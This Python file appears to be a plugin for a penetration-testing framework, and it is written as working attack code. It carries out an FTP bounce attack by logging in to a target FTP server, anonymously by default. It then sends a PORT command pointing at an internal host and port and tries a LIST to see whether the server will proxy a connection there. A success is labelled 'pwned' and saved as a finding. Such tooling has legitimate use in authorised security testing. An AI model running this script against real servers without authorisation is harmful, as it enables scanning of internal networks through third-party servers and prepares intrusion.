# scripts/ftp/attack/bounce_scan.py
import socket
import ftplib
from scripts.base import BaseScript
from core.output import print_result, print_check, console
from core import session_db

class Script(BaseScript):
    name        = "bounce-scan"
    protocol    = "ftp"
    category    = "attack"
    description = "FTP Bounce Attack: detecta si el servidor permite PORT arbitrario para proxy-scan de hosts internos. CVE clásico RFC 959."

    def run(self, **kwargs):
        port        = int(kwargs.get("port") or 21)
        timeout     = int(kwargs.get("timeout") or self.target.timeout or 5)
        user        = kwargs.get("user") or self.creds.user or "anonymous"
        password    = kwargs.get("password") or self.creds.password or "anonymous@"
        scan_target = kwargs.get("scan_target") or "127.0.0.1"
        scan_port   = int(kwargs.get("scan_port") or 22)
        ip          = self.target.ip

        print_result("FTP", ip, "info",
                     f"bounce-scan: PORT hacia {scan_target}:{scan_port}")

        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout)
            ftp.login(user, password)

            octets  = scan_target.replace(".", ",")
            p1, p2  = scan_port >> 8, scan_port & 0xFF
            port_cmd = f"PORT {octets},{p1},{p2}"

            resp = ftp.sendcmd(port_cmd)
            code = resp[:3]

            if code == "200":
                bounce_ok = False
                try:
                    ftp.retrlines("LIST")
                    bounce_ok = True
                except Exception:
                    pass

                if bounce_ok:
                    print_result("FTP", ip, "pwned",
                                 f"BOUNCE ATTACK POSIBLE — conecta a {scan_target}:{scan_port}")
                    session_db.save_finding(ip, "FTP", "bounce_attack",
                                            f"scan_target={scan_target}:{scan_port}")
                else:
                    print_result("FTP", ip, "info",
                                 "PORT aceptado pero conexión rechazada — parcialmente vulnerable")
            else:
                print_check(f"Bounce attack bloqueado (código {code})", ok=True)

            ftp.quit()
            return {"vulnerable": code == "200", "port_response": resp, "scan_target": scan_target}

        except Exception as e:
            print_result("FTP", ip, "fail", f"error: {e}")
            return None
